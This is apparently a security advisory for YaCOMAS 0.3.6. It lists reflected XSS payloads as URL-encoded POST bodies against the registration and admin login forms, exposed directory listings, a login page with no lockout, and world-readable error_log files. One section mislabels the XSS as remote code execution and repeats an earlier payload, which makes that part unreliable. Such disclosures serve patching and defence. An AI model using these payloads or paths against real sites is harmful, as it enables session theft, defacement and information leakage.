@@ -1,0 +1,131 @@
+===================================================================
+    YaCOMAS 0.3.6 Multiple vulnerability 
+===================================================================
+    
+Software:   Yacomas 0.3.6
+Vendor:     http://yacomas.sourceforge.net/
+Vuln Type:  Multiple Vulnerability
+Download link:  http://patux.net/downloads/yacomas-0.3.6_alpha.tar.gz
+Author:     Pr@fesOr X
+contact:    profesor_x(at)otmail.com
+Home:       www.ccat.edu.mx
+Company:    Centro de Investigaciones en Alta Tecnologia
+ 
+  
+ 
+=========================
+--Description  XSS  --
+=========================
+
+Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user. Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser. 
+
+Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them. An attacker can steal the session cookie and take over the account, impersonating the user. It is also possible to modify the content of the page presented to the user. 
+
+=============================== 
+--= Attack details No. 1 =--
+===============================
+
+This vulnerability affects /yacomas/asistente/index.php. 
+
+
+http://www.site.com/yacomas/asistente/index.php?opc=1
+
+
+--URL encoded POST input S_apellidos was set to " onmouseover=prompt(11111111111) bad="
+
+
+--The input is reflected inside a tag element between double quotes.
+
+
+--details:  can you inyect this in the HTTP headers whit this data:
+
+-----------------------
+C_sexo=M&I_b_day=0&I_b_month=0&I_b_year=0&I_id_estado=0&I_id_estudios=0&I_id_tasistente=0&S_apellidos=%22%20onmouseover%3dprompt%2811111111111%29%20bad%3d%22&S_ciudad=&S_login=oijclpgk&S_mail=hola@ccat.edu.mx.tst&S_nombrep=oijclpgk&S_org=&S_passwd=rodolfo&S_passwd2=rodolfo&submit=Registrarme
+------------------------
+
+
+=============================== 
+--= Vulnerable forms and variables =--
+===============================
+
+S_apellidos
+s_ciudad
+s_login
+s_mail
+s_nombrep
+s_org
+
+
+=============================== 
+--= Attack XSS details No. 2 =--
+===============================
+
+http://www.site.com/yacomas/admin/index.php
+
+
+--details:  can you inyect this in the HTTP headers whit this data in the Content-Length: header
+
+------------------------------------------
+
+S_login=%27%22%3E%3E%3Cmarquee%3Ehacked+by+profesorx%3C%2Fmarquee%3E&S_passwd=%27%22%3E%3E%3Cmarquee%3Ehacked+by+profesorx%3C%2Fmarquee%3E&submit=Iniciar
+
+-------------------------------------------------------------------
+
+
+==========================================
+--= Attack XSS remote code execution No. 2 =--
+==========================================
+
+http://www.site.com/yacomas/admin/index.php
+
+
+--details:  can you inyect this in the HTTP headers whit this data in the Content-Length: header
+
+------------------------------------------
+
+S_login=%27%22%3E%3E%3Cmarquee%3Ehacked+by+profesorx%3C%2Fmarquee%3E&S_passwd=%27%22%3E%3E%3Cmarquee%3Ehacked+by+profesorx%3C%2Fmarquee%3E&submit=Iniciar
+
+-------------------------------------------------------------------
+
+
+==============================
+--Directory Listing Disclosure  --
+==============================
+
+
+The web server is configured to display the list of files contained in this directory  This is not recommended because the directory may contain files that are not normally exposed through links on the web site.
+
+A user can view a list of all files from this directory possibly exposing sensitive information.
+
+http://www.site.com/yacomas/images/
+
+http://www.site.com/yacomas/images/buttons/
+
+
+
+
+=====================================
+--Login page password-guessing attack--
+=====================================
+
+A common threat web developers face is a password-guessing attack known as a brute force attack. A brute-force attack is an attempt to discover a password by systematically trying every possible combination of letters, numbers, and symbols until you discover the one correct combination that works. 
+
+This login page doesn't have any protection against password-guessing attacks (brute force attacks). It's recommended to implement some type of account lockout after a defined number of incorrect password attempts. Consult Web references for more information about fixing this problem. 
+
+
+/yacomas/admin/index.php. 
+
+
+
+=====================================
+--Show sensive Files---
+=====================================
+
+http://www.site.com/yacomas/admin/error_log
+
+http://www.site.com/yacomas/asistente/error_log
+
+http://www.site.com/yacomas/ponente/error_log
+
+
+this link can contain data from your sql like the path, username, databases, path names and partial SQL code and some PHP data important for hackers to know the system like Functions, names and file names.
